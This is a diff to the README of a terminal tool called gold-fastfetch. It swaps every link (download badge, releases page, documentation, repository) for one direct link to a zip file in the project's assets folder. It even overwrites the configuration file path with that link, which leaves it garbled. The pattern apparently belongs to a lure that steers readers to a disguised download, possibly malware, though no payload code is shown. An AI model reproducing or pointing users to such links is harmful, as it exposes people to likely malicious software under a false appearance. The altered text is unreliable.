@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download gold-fastfetch](https://img.shields.io/badge/Download-gold--fastfetch-brightgreen)](https://github.com/pontsho101/gold-fastfetch/releases)
+[![Download gold-fastfetch](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before downloading, make sure your system meets these requirements:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page where you can get the latest version of gold-fastfetch.
 
-   [Download gold-fastfetch](https://github.com/pontsho101/gold-fastfetch/releases)
+   [Download gold-fastfetch](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)
 
 2. **Choose Your Version:** On the releases page, look for the newest version. Download the appropriate file for your system.
 
@@ -52,7 +52,7 @@ Congratulations! You are now set up to enjoy an enhanced terminal experience.
 
 You can customize gold-fastfetch to suit your preferences. Here’s how:
 
-- **Edit Configuration File:** Locate the configuration file usually found in `~/.config/fastfetch/config.conf`.
+- **Edit Configuration File:** Locate the configuration file usually found in `~https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip`.
 - **Adjust Settings:** Modify settings for colors, icons, and displayed information. There's plenty of room for personalization.
 
 ## 🛠️ Troubleshooting
@@ -80,8 +80,8 @@ For support, feel free to reach out via the issues section of our GitHub reposit
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/pontsho101/gold-fastfetch/releases)
-- [Documentation](https://github.com/pontsho101/gold-fastfetch/wiki)
-- [GitHub Repository](https://github.com/pontsho101/gold-fastfetch)
+- [Releases Page](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/pontsho101/gold-fastfetch/main/assets/fastfetch-gold-1.6.zip)
 
 Thank you for choosing gold-fastfetch to enhance your terminal!
